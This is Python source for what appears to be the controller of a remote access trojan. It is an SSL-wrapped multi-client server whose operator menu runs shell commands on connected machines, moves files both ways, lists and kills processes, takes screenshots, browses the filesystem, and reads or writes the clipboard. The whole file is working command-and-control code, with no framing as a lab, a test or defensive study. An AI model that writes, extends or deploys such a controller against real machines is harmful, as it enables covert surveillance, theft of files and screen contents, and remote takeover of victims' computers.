import socket
import ssl
import os
import threading
import platform 

HOST = "127.0.0.1"
PORT = 6654
win = platform.system()
clients = {}
clients_lock = threading.Lock()

# ---------- SSL ----------

def generate_cert():
    """Generate a self-signed cert if one doesn't exist."""
    if not os.path.exists("server.crt") or not os.path.exists("server.key"):
        print("[*] Generating self-signed SSL certificate...")
        os.system(
            'openssl req -x509 -newkey rsa:4096 -keyout server.key '
            '-out server.crt -days 365 -nodes '
            '-subj "/CN=localhost" 2>/dev/null'
        )
        print("[+] Certificate generated: server.crt / server.key")

def wrap_ssl(server_sock):
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain("server.crt", "server.key")
    return context.wrap_socket(server_sock, server_side=True)

# ---------- Header helpers ----------

def recv_header(sock):
    data = b""
    while b"\n" not in data:
        chunk = sock.recv(1)
        if not chunk:
            raise ConnectionError("Connection closed while reading header.")
        data += chunk
    return data.decode().strip()

# ---------- File transfer ----------

def send_file(sock, filename):
    if not os.path.exists(filename):
        print(f"[-] File not found: {filename}")
        return False
    filesize = os.path.getsize(filename)
    header = f"{os.path.basename(filename)}|{filesize}\n"
    sock.sendall(header.encode())
    sent = 0
    with open(filename, "rb") as f:
        while True:
            chunk = f.read(65536)
            if not chunk:
                break
            sock.sendall(chunk)
            sent += len(chunk)
            percent = sent / filesize * 100 if filesize else 100
            print(f"\r[+] Sending {filename}: {percent:5.1f}%", end="", flush=True)
    print(f"\n[+] {filename} sent successfully.")
    return True

def receive_file(sock):
    header = recv_header(sock)
    if header.startswith("ERROR"):
        _, message = header.split("|", 1)
        print(f"[-] Client error: {message}")
        return False
    filename, filesize = header.rsplit("|", 1)
    filesize = int(filesize)
    received = 0
    with open(filename, "wb") as f:
        remaining = filesize
        while remaining > 0:
            chunk = sock.recv(min(65536, remaining))
            if not chunk:
                raise ConnectionError("Connection closed before full file was received.")
            f.write(chunk)
            remaining -= len(chunk)
            received += len(chunk)
            percent = received / filesize * 100 if filesize else 100
            print(f"\r[+] Receiving {filename}: {percent:5.1f}%", end="", flush=True)
    print(f"\n[+] {filename} received successfully.")
    return True

# ---------- High-level commands ----------

def send_command(sock, command):
    sock.sendall((command + "\n").encode())

def recv_until_end(sock):
    response = b""
    while not response.endswith(b"<<END>>"):
        chunk = sock.recv(65536)
        if not chunk:
            break
        response += chunk
    return response.decode().replace("<<END>>", "").strip()

def download(sock, filename):
    send_command(sock, f"DOWNLOAD|{filename}")
    receive_file(sock)

def upload(sock, filename):
    send_command(sock, f"UPLOAD|{filename}")
    send_file(sock, filename)

def shell(sock, command):
    send_command(sock, f"SHELL|{command}")
    print(f"\n[*] Response:\n{recv_until_end(sock)}")

def process_list(sock):
    send_command(sock, "PSLIST")
    print(f"\n[*] Process List:\n{recv_until_end(sock)}")

def kill_process(sock, pid):
    send_command(sock, f"KILL|{pid}")
    response = sock.recv(4096).decode().strip()
    print(f"\n[*] Response:\n{response}")

def screenshot(sock):
    send_command(sock, "SCREENSHOT")
    receive_file(sock)

def file_browser(sock, path):
    send_command(sock, f"BROWSE|{path}")
    response = sock.recv(65536).decode().strip()
    print(f"\n{response}")

def clipboard_read(sock):
    send_command(sock, "CLIP_READ")
    response = sock.recv(65536).decode().strip()
    print(f"\n[*] Clipboard:\n{response}")

def clipboard_write(sock, text):
    send_command(sock, f"CLIP_WRITE|{text}")
    response = sock.recv(4096).decode().strip()
    print(f"\n[*] Response:\n{response}")

# ---------- Client handler thread ----------

def handle_client(conn, addr, client_id):
    print(f"\n[+] Client {client_id} connected from {addr}")
    with clients_lock:
        clients[client_id] = {"conn": conn, "addr": addr}
    try:
        while True:
            threading.Event().wait(1)
    except Exception:
        pass
    finally:
        with clients_lock:
            if client_id in clients:
                del clients[client_id]
        conn.close()
        print(f"\n[-] Client {client_id} disconnected.")

# ---------- Per-client interactive menu ----------

def interact(client_id):
    with clients_lock:
        if client_id not in clients:
            print(f"[-] Client {client_id} not found.")
            return
        conn = clients[client_id]["conn"]
        addr = clients[client_id]["addr"]

    print("  1                   - Get device info")
    print("  2                   - Say hello")
    print("  3                   - Count files")
    print("  4                   - Count images")
    print("  6                   - Get current working directory")
    print("  shell <command>     - Execute shell command (persistent cwd)")
    print("  download <filename> - Download file from client")
    print("  upload <filename>   - Upload file to client")
    print("  ps                  - List all running processes")
    print("  kill <pid>          - Kill a process by PID")
    print("  screenshot          - Capture client screen")
    print("  browse <path>       - Browse filesystem on client")
    print("  clip read           - Read client clipboard")
    print("  clip write <text>   - Write text to client clipboard")
    print("  back                - Return to client list")
    print("="*60)
    print("  SSL encrypted connection active")

    while True:
        try:
            raw = input(f"[{client_id}]> ").strip()
        except EOFError:
            break

        if not raw:
            continue

        parts = raw.split(maxsplit=1)
        cmd = parts[0].lower()

        try:
            if cmd in ["1", "2", "3", "4", "5", "6"]:
                send_command(conn, cmd)
                response = conn.recv(4096).decode().strip()
                print(f"\n[*] Response:\n{response}")

            elif cmd == "shell" and len(parts) == 2:
                shell(conn, parts[1])

            elif cmd == "shell":
                print("[-] Usage: shell <command>")

            elif cmd == "download" and len(parts) == 2:
                download(conn, parts[1])

            elif cmd == "upload" and len(parts) == 2:
                upload(conn, parts[1])

            elif cmd == "ps":
                process_list(conn)

            elif cmd == "kill" and len(parts) == 2:
                kill_process(conn, parts[1])

            elif cmd == "kill":
                print("[-] Usage: kill <pid>")

            elif cmd == "screenshot":
                screenshot(conn)
                print("[+] Screenshot saved.")

            elif cmd == "browse" and len(parts) == 2:
                file_browser(conn, parts[1])

            elif cmd == "browse":
                print("[-] Usage: browse <path>")

            elif cmd == "clip" and len(parts) == 2:
                sub = parts[1].split(maxsplit=1)
                if sub[0].lower() == "read":
                    clipboard_read(conn)
                elif sub[0].lower() == "write" and len(sub) == 2:
                    clipboard_write(conn, sub[1])
                else:
                    print("[-] Usage: clip read | clip write <text>")

            elif cmd == "back":
                break

            else:
                print("[-] Unknown command or missing argument.")

        except (ConnectionError, BrokenPipeError, OSError):
            print(f"[-] Client {client_id} disconnected.")
            break

# ---------- Main ----------

def main():
    generate_cert()

    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_sock.bind((HOST, PORT))
    server_sock.listen(10)
    server_sock = wrap_ssl(server_sock)
    print(f"[*] Server listening on {HOST}:{PORT} (SSL)...")

    client_counter = [0]

    def accept_loop():
        while True:
            try:
                conn, addr = server_sock.accept()
                client_counter[0] += 1
                cid = client_counter[0]
                t = threading.Thread(target=handle_client, args=(conn, addr, cid), daemon=True)
                t.start()
            except Exception:
                break

    threading.Thread(target=accept_loop, daemon=True).start()
    print("Type 'list' to see connected clients, 'use <id>' to interact, 'quit' to exit.\n")

    while True:
        try:
            raw = input("server> ").strip()
        except (EOFError, KeyboardInterrupt):
            break

        if not raw:
            continue

        parts = raw.split(maxsplit=1)
        cmd = parts[0].lower()

        if cmd == "list":
            with clients_lock:
                if not clients:
                    print("[-] No clients connected.")
                else:
                    print(f"\n{'ID':<5} {'Address':<25} {win}")
                    print("-" * 30)
                    for cid, info in clients.items():
                        print(f"{cid:<5} {str(info['addr']):<25}")
                    print()

        elif cmd == "use" and len(parts) == 2:
            try:
                interact(int(parts[1]))
            except ValueError:
                print("[-] Usage: use <id>")

        elif cmd == "quit":
            break

        else:
            print("[-] Commands: list | use <id> | quit")

    server_sock.close()
    print("[-] Server shut down.")

if __name__ == "__main__":
    main()
